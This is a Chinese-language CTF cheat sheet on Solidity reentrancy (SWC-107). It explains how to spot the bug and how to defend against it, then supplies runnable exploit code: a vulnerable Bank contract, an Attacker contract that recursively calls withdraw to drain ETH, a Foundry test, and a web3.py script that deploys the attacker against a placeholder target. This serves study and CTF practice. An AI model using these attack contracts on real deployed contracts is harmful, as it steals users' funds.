---
title: Solidity 重入攻击（Reentrancy / SWC-107）
category: blockchain
tags: [solidity, 重入, reentrancy, swc-107, ctf]
signals: [合约有 withdraw, 先转账后扣余额, call.value, fallback 函数, msg.sender.call, 合约余额大于用户余额, 可重复领取, eth 余额, 攻击合约]
difficulty: medium
source: "CTF-Wiki / SWC Registry（SWC-107）"
tools: [solidity, foundry, python, web3py]
updated: 2026-10-22
---

## 一、识别信号（题面长什么样）

- 合约里有 `withdraw()`，且顺序是 `msg.sender.call.value(x)()` **之后**才 `balance -= x`。
- 题面说"合约里有 10 ETH，你只有 1 ETH，把合约掏空"。
- 有 `fallback()` / `receive()`，或目标函数调用了外部合约。
- 目标是 `isSolved()` / `balance == 0` 这类判定。
- 变量用 `call` 而不是 `transfer`/`send`（后两者只有 2300 gas，重入困难）。
- 关键词：重入、reentrancy、bank、h4ck、babybank。

## 二、原理

```solidity
function withdraw(uint amount) public {
    require(balanceOf[msg.sender] >= amount);
    (bool ok,) = msg.sender.call{value: amount}("");   // 外部调用：转给攻击合约
    require(ok);
    balanceOf[msg.sender] -= amount;                   // 转账之后才扣款
}
```

`call` 会把所有剩余 gas 交给接收方合约的 `fallback`。攻击合约在 `fallback` 里**再次调用** `withdraw`，此时 `balanceOf` 还没扣，`require` 仍然通过 → 反复取款，直到目标合约余额耗尽（用状态变量限制递归次数，避免 gas 耗尽）。

**防御**：checks-effects-interactions 顺序（先扣余额）、`nonReentrant` 修饰器、`transfer`/`send`。Solidity 0.8 只在语义上加了溢出检查，**不防重入**。

## 三、解题步骤

1. 读合约，找 `call` + 状态更新顺序错乱的地方。
2. 写攻击合约：`attack()` 里先存一点钱（如需），调用 `withdraw`。
3. `fallback` 里递归调用 `withdraw`，用计数器限制次数。
4. 部署并执行，把偷到的 ETH 转走。
5. 触发题目的 `isSolved`。

## 四、可直接运行的脚本

漏洞合约 + 攻击合约（Foundry 可直接跑）：

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Bank {
    mapping(address => uint256) public balanceOf;
    function deposit() external payable { balanceOf[msg.sender] += msg.value; }
    function withdraw(uint256 amount) external {
        require(balanceOf[msg.sender] >= amount, "insufficient");
        (bool ok, ) = msg.sender.call{value: amount}("");
        require(ok, "transfer failed");
        balanceOf[msg.sender] -= amount;      // ← 漏洞：与转账顺序反了
    }
}

contract Attacker {
    Bank public bank;
    uint256 public count;
    constructor(address _bank) { bank = Bank(_bank); }

    function attack() external payable {
        bank.deposit{value: msg.value}();      // 存 1 ETH
        bank.withdraw(msg.value);              // 开始重入
    }

    receive() external payable {
        if (count < 5) {                       // 限制次数，防止 gas 耗尽
            count++;
            bank.withdraw(1 ether);
        }
    }
    function drain() external { payable(msg.sender).transfer(address(this).balance); }
}
```

Foundry 测试：

```solidity
// test/Reentrancy.t.sol
import {Test} from "forge-std/Test.sol";

contract ReentrancyTest is Test {
    Bank bank; Attacker atk;
    function setUp() public {
        bank = new Bank();
        vm.deal(address(bank), 10 ether);      // 目标 10 ETH
        atk = new Attacker(address(bank));
        vm.deal(address(atk), 1 ether);
    }
    function testExploit() public {
        atk.attack{value: 1 ether}();
        assertEq(address(bank).balance, 0);    // 掏空
        console.log("attacker balance:", address(atk).balance);
    }
}
```

```bash
forge test -vvv --match-contract ReentrancyTest
```

Python / web3.py 版（CTF 远程环境常见）：

```python
from web3 import Web3
from solcx import compile_source

w3 = Web3(Web3.HTTPProvider("http://TARGET:8545"))
acct = w3.eth.accounts[0]

ATTACKER_SRC = """
pragma solidity ^0.8.0;
interface IBank { function deposit() external payable; function withdraw(uint256) external; }
contract A {
    IBank b; uint c;
    constructor(address x) { b = IBank(x); }
    function go() external payable { b.deposit{value: msg.value}(); b.withdraw(msg.value); }
    receive() external payable { if (c < 5) { c++; b.withdraw(1 ether); } }
}
"""
compiled = compile_source(ATTACKER_SRC, output_values=["abi", "bin"],
                          solc_version="0.8.19")
_, iface = list(compiled.items())[0]
abi, bytecode = iface["abi"], iface["bin"]

A = w3.eth.contract(abi=abi, bytecode=bytecode)
tx = A.constructor("0xTARGET_CONTRACT").transact({"from": acct})
a = w3.eth.wait_for_transaction_receipt(tx).contractAddress
w3.eth.contract(address=a, abi=abi).functions.go().transact(
    {"from": acct, "value": w3.to_wei(1, "ether")})
print("target balance:", w3.eth.get_balance("0xTARGET_CONTRACT"))
```

## 五、常见坑 / 变体

- **`transfer`/`send` 只有 2300 gas**：不够重入，改用 `call` 场景才成立。
- **递归深度**：不加计数会 gas 耗尽，用 `count < N` 控制；或者用 `while (balance >= x)`。
- **合约无 payable fallback**：先在攻击合约里实现 `receive()` 接收 ETH，或 `selfdestruct` 强转。
- **跨函数重入**：`withdraw → 外部调用 → deposit/transfer` 的互调（cross-function reentrancy）。
- **只读重入（read-only reentrancy）**：在外部调用期间调用另一个合约的 `getPrice()`，价格还没更新 → 预言机操纵（DeFi 常见）。
- 变体：**ERC777 `tokensReceived` 回调**、**ERC721 `onERC721Received`** 都会产生外部调用。
- 变体：**重入 + 整数下溢**：`balance -= amount` 在 0.8 之前会变成巨大值。
- 变体：**CTF 里可能是 `withdrawAll()` 的多签重入**。

## 六、参考来源

- [CTF-Wiki Re-Entrancy（含强网杯 2019、N1CTF 2019 题目）](https://ctf-wiki.org/blockchain/ethereum/attacks/re-entrancy/)
- [SWC Registry - SWC-107 Reentrancy](https://swcregistry.io/docs/SWC-107)
- [CTF-Wiki 区块链题目附件仓库](https://github.com/ctf-wiki/ctf-challenges/tree/master/blockchain)
- [Solidity 官方文档 - 调用外部合约的安全考量](https://docs.soliditylang.org/en/latest/security-considerations.html)
